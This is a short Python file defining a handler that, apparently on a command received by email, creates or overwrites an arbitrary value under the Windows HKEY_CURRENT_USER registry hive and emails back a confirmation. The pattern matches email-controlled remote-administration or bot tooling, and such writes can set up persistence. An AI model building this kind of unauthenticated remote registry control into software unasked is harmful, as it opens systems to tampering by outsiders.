import winreg
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from my_utils import finish_and_send

def reply_modify_reg(original_email, USERNAME, PASSWORD, key_path, entry_name, entry_value):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
    except:
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
    winreg.SetValueEx(reg_key, entry_name, 0, winreg.REG_SZ, entry_value)
    
    rep = MIMEMultipart('mixed')
    rep.attach(MIMEText('Entry modified successfully'))
    
    finish_and_send(rep, original_email, USERNAME, PASSWORD)
        
    